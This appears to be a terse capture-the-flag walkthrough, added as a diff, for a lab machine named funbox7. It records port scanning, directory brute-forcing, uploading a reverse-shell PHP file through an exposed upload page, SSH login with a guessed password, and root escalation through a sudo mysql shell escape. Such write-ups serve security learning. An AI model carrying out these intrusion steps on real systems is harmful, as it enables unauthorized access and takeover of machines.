@@ -1,0 +1,37 @@
+sudo nmap 192.168.144.132 found port 22,80 open
+
+$ gobuster dir -u http://192.168.144.132 -w /usr/share/wordlists/dirb/big.txt -t 100 -x php,txt
+# important for add -x php,txt , by add these extension, it could enumerate like mini.php instead mimi.
+
+found /mini.php which can upload file reverse_shell.php then edit chmod to 777.
+run in browser http://192.168.144.132/reverse_shell.php
+
+get in to it with www-data privilege
+$ cd www
+$ ls -la
+-rw-r--r--  1 www-data www-data   33 Apr 14 02:04 local.txt
+
+$ ls /home
+goat
+harry
+karla
+oracle
+sally
+
+ssh goat@192.168.144.132
+try simple password goat. get a shell with goat privilege
+
+goat@funbox7:/$ sudo -l
+User goat may run the following commands on funbox7:
+    (root) NOPASSWD: /usr/bin/mysql
+
+exploit the fact that MySQL allows executing system commands via the \! (system) shell escape.
+    
+goat@funbox7:/$ sudo /usr/bin/mysql
+mysql> \! /bin/sh
+
+or sudo mysql -e '\! /bin/sh'
+
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
